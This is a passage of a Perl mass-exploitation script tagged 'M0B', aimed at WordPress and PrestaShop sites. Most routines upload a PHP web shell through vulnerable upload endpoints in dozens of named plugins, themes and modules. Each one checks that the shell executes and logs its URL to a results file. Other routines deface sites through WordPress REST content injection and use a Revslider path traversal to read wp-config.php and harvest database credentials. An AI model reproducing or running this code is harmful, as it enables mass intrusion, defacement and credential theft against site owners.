print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wtffup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wtffup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Work The Flow File Upload";

print color('bold red'),"[FAILED]\n";
}
}

################ WP Job Manger #####################
sub wpjm(){
my $url = "$site/jm-ajax/upload_file/";
my $image ="m.gif";
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$image"] ]
           
            );

$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/m.gif";
$checkpofwup = $ua->get("$jobmangerup")->content_type;
if($checkpofwup =~/image\/gif/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Job Manger";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jobmangerup\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
open (TEXT, '>>Result/index.txt');
print TEXT "$jobmangerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Job Manger";

print color('bold red'),"[FAILED]\n";
}
}

################  PHP Event Calendar #####################
sub phpeventcalendar(){
my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="l.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/l.php?X=M0B";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"PHP Event Calendar";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $phpevup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$phpevup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"PHP Event Calendar";

print color('bold red'),"[FAILED]\n";
}
}

################ Synoptic #####################
sub synoptic(){
my $url = "$site/wp-content/themes/synoptic/lib/avatarupload/upload.php";
my $shell ="l.php";
my $field_name = "qqfile";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/l.php?X=M0B";

$checkSynopticup = $ua->get("$Synopticup")->content;
if($checkSynopticup =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Synoptic";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $Synopticup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$Synopticup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Synoptic";

print color('bold red'),"[FAILED]\n";
}
}

################ Wpshop #####################
sub Wpshop(){
my $url = "$site/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload";
my $shell ="l.php";
my $field_name = "wpshop_file";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/l.php?X=M0B";

$checkwpshopup = $ua->get("$wpshopup")->content;
if($checkwpshopup =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wp Shop";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpshopup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wpshopup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wp Shop";

print color('bold red'),"[FAILED]\n";
}
}
################ Content Injection
sub wpinjection(){
$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';

$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;

$ajx = $site . '/wp-json/wp/v2/posts/'.$id;

$sirina=$id . 'justrawdata';
$index='FUCKED BY M0B :)';
$gassface = POST $ajx, [
'id' => $sirina, 'slug' => '/m.htm', 'title' => 'M0B', 'content' => $index];
$response = $ua->request($gassface);
$stat = $response->content;
    if ($stat =~ /FUCKED BY/){
$urljson = "$site/m.htm";
$link = $ua->get($site);
$link = $link->request->uri;
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Content Injection";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Injected Successfully\n";
print color('bold white'),"  [Link] => $urljson\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$urljson\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Content Injection";

print color('bold red'),"[FAILED]\n";
}
}
}
sub getconfig1() {

print"[+] Revslider Config 1\n";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold green');
print "[Sucess]\n";
    print color('reset');
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t[-]Database Name = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/config.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print "\t[-]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/config.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t[-]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>Result/config.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t[-]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/config.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }
}
}
}
sub Wordpress_Themes() {
$path = "/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php?folder=%2F";
$site_vul = "http://".$site."".$path;
$res = $ua->request(POST $site_vul,
Content_Type => 'form-data',
Content => [
Filedata => ["mob.txt"],
],
);

$url = "http://".$site."/mob.txt";
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($request);
$nullcracker = $response->content;
if ($nullcracker =~ /M0B/){
print "[+] Wordpress_Themes [VULNERABLE]";
print "[+] Success => $url\n";
open(BEN,">>Result/result.txt");
print BEN "$url\n";
close(BEN);
}else{
print "[-] Exploiting Failed ! \n";
}
}

##################
###### PRESTASHOP
################ columnadverts #####################
sub columnadverts(){
my $url = "$site/modules/columnadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/l.php?X=M0B";

my $checkcolumnadverts = $ua->get("$columnadvertsup")->content;
if($checkcolumnadverts =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"columnadverts";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $columnadvertsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$columnadvertsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"columnadverts";

print color('bold red'),"[FAILED]\n";
}
}


################ soopamobile #####################
sub soopamobile(){
my $url = "$site/modules/soopamobile/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$soopamobileup="$site/modules/soopamobile/slides/l.php?X=M0B";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopamobile";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopamobile";

print color('bold red'),"[FAILED]\n";
}
}

################ soopabanners #####################
sub soopabanners(){
my $url = "$site/modules/soopabanners/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$soopabannersup="$site/modules/soopabanners/slides/l.php?X=M0B";

my $checksoopabanners = $ua->get("$soopabannersup")->content;
if($checksoopabanners =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopabanners";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $soopabannersup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$soopabannersup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopabanners";

print color('bold red'),"[FAILED]\n";
}
}

################ vtermslideshow #####################
sub vtermslideshow(){
my $url = "$site/modules/vtermslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$vtermslideshowup="$site/modules/vtermslideshow/slides/l.php?X=M0B";

my $checkvtermslideshow = $ua->get("$vtermslideshowup")->content;
if($checkvtermslideshow =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Vtermslideshow";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $vtermslideshowup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$vtermslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Vtermslideshow";

print color('bold red'),"[FAILED]\n";
}
}

################ simpleslideshow #####################
sub simpleslideshow(){
my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/l.php?X=M0B";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"simpleslideshow";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $simpleslideshowup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$simpleslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"simpleslideshow";

print color('bold red'),"[FAILED]\n";
}
}

################ productpageadverts #####################
sub productpageadverts(){
my $url = "$site/modules/productpageadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$productpageadvertsup="$site/modules/productpageadverts/slides/l.php?X=M0B";

my $checkproductpageadverts = $ua->get("$productpageadvertsup")->content;
if($checkproductpageadverts =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"productpageadverts";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $productpageadvertsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$productpageadvertsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"productpageadverts";

print color('bold red'),"[FAILED]\n";
}
}

################ homepageadvertise #####################
sub homepageadvertise(){
my $url = "$site/modules/homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$homepageadvertiseup="$site/modules/homepageadvertise/slides/l.php?X=M0B";

my $checkhomepageadvertise = $ua->get("$homepageadvertiseup")->content;
if($checkhomepageadvertise =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $homepageadvertiseup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise";

print color('bold red'),"[FAILED]\n";
}
}

################ homepageadvertise2 #####################
sub homepageadvertise2(){
my $url = "$site/modules/homepageadvertise2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$homepageadvertise2up="$site/modules/homepageadvertise2/slides/l.php?X=M0B";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise2";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $homepageadvertise2up\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise2";

print color('bold red'),"[FAILED]\n";
}
}

################ jro_homepageadvertise #####################
sub jro_homepageadvertise(){
my $url = "$site/modules/jro_homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/l.php?X=M0B";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise";

print color('bold red'),"[FAILED]\n";
}
}

################ attributewizardpro #####################
sub attributewizardpro(){
my $url = "$site/modules/attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$attributewizardproup="$site/modules/attributewizardpro/file_uploads/l.php?X=M0B";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$attributewizardproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro";

print color('bold red'),"[FAILED]\n";
}
}

################ 1attributewizardpro #####################
sub oneattributewizardpro(){
my $url = "$site/modules/1attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/l.php?X=M0B";

my $checkoneattributewizardpro = $ua->get("$oneattributewizardproup")->content;
if($checkoneattributewizardpro =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"1attributewizardpro";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $oneattributewizardproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$oneattributewizardproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"1attributewizardpro";

print color('bold red'),"[FAILED]\n";
}
}

################ attributewizardpro.OLD #####################
sub attributewizardproOLD(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/l.php?X=M0B";

my $checkattributewizardproOLD = $ua->get("$attributewizardproOLDup")->content;
if($checkattributewizardproOLD =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardproOLDup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$attributewizardproOLDup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";

print color('bold red'),"[FAILED]\n";
}
}


################ attributewizardpro_x #####################
sub attributewizardpro_x(){
my $url = "$site/modules/attributewizardpro_x/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["l.php"],]);

$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/l.php?X=M0B";

my $checkattributewizardpro_x = $ua->get("$attributewizardpro_xup")->content;
if($checkattributewizardpro_x =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro_x";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardpro_xup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$attributewizardpro_xup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro_x";

print color('bold red'),"[FAILED]\n";
}
}

################ advancedslider #####################
sub advancedslider(){
my $url = "$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["l.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/l.php.png?X=M0B";

my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
if($checkadvancedslider =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"advancedslider";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $advancedsliderup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$advancedsliderup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"advancedslider";

print color('bold red'),"[FAILED]\n";
}
}

################ cartabandonmentpro #####################
sub cartabandonmentpro(){
my $url = "$site/modules/cartabandonmentpro/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["l.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/l.php.png?X=M0B";

my $checkcartabandonmentpro = $ua->get("$cartabandonmentproup")->content;
if($checkcartabandonmentpro =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentpro";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cartabandonmentproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$cartabandonmentproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentpro";

print color('bold red'),"[FAILED]\n";
}
}

################ cartabandonmentproOld #####################
sub cartabandonmentproOld(){
my $url = "$site/modules/cartabandonmentproOld/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["l.php.png"],]);

$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/l.php.png?X=M0B";

my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
if($checkcartabandonmentproOld =~/M0B/) {
  
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentproOld";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cartabandonmentproOldup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$cartabandonmentproOldup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentproOld";

print color('bold red'),"[FAILED]\n";
}
}

################ videostab #####################
sub videostab(){
my $url = "$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["l.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/l.php.mp4?X=M0B";

my $checkvideostab = $ua->get("$videostabup")->content;
if($checkvideostab =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"videostab";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $videostabup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$videostabup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"videostab";

print color('bold red'),"[FAILED]\n";
}
}

################ wg24themeadministration #####################
sub wg24themeadministration(){
my $url = "$site/modules//wg24themeadministration/wg24_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["l.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/l.php?X=M0B";

my $checkwg24themeadministration = $ua->get("$wg24themeadministrationup")->content;
if($checkwg24themeadministration =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wg24themeadministration";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wg24themeadministrationup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wg24themeadministrationup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wg24themeadministration";

print color('bold red'),"[FAILED]\n";
}
}

################ fieldvmegamenu #####################
sub fieldvmegamenu(){
my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
my $shell ="l.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/l.php?X=M0B";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"fieldvmegamenu";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $fieldvmegamenuup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$fieldvmegamenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"fieldvmegamenu";

print color('bold red'),"[FAILED]\n";
}
}


################ wdoptionpanel #####################
sub wdoptionpanel(){
my $url = "$site/modules/wdoptionpanel/wdoptionpanel_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["l.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/l.php?X=M0B";

my $checkwdoptionpanel = $ua->get("$wdoptionpanelup")->content;
if($checkwdoptionpanel =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wdoptionpanel";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wdoptionpanelup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wdoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wdoptionpanel";

print color('bold red'),"[FAILED]\n";
}
}


################ pk_flexmenu #####################
sub pk_flexmenu(){
my $url = "$site/modules/pk_flexmenu/ajax/upload.php";
my $shell ="l.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/l.php?X=M0B";

my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $pk_flexmenuup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$pk_flexmenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";

print color('bold red'),"[FAILED]\n";
}
}

################ pk_vertflexmenu #####################
sub pk_vertflexmenu(){
my $url = "$site/modules/pk_vertflexmenu/ajax/upload.php";
my $shell ="l.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/l.php?X=M0B";

my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
if($checkpk_vertflexmenu =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_vertflexmenu";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $pk_vertflexmenuup\n";

open (TEXT, '>>Result/Shells.txt');
